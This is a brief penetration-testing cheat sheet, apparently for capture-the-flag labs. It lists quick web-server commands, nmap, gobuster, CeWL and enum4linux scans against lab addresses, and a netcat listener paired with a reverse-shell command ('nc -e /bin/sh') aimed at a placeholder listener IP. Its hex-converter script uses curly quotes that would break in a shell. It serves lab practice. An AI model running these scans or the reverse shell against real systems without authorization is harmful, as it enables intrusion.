# CheatSheet

## Webserver

### Python

```python
python -m SimpleHTTPServer
```

```python
python3 -m http.server
```

### PHP
```php
php -S 0.0.0.0:8000
```
### Ruby
```ruby
ruby -run -e httpd . -p 8000
```
## nmap
```shell-script
nmap -sC -sV -oA nmap/openadmin 10.10.10.171
```
## gobuster
```bash
gobuster dir -u http:10.10.10.10/ -w /path/to/wordlist
```
##  CeWL
```bash
cewl -d 2 -m 5 -w genwords.txt https://10.10.10.10
```
## [enum4linux](https://tools.kali.org/information-gathering/enum4linux)
```bash
enum4linux -U -o 10.10.10.10
```
## Shells

### Set Listener 
```bash
nc -lnvp 4000
```

### Set Reverse Shell on Target
```bash
nc -e /bin/sh IP.OF.LISTENER 4000
```
## Usefuls Scripts
### HEX Converter
```bash
#!/bin/bash
echo $1 | tr -d “\n” | hexdump -e ‘16/1 “%02x “ “\n”
```
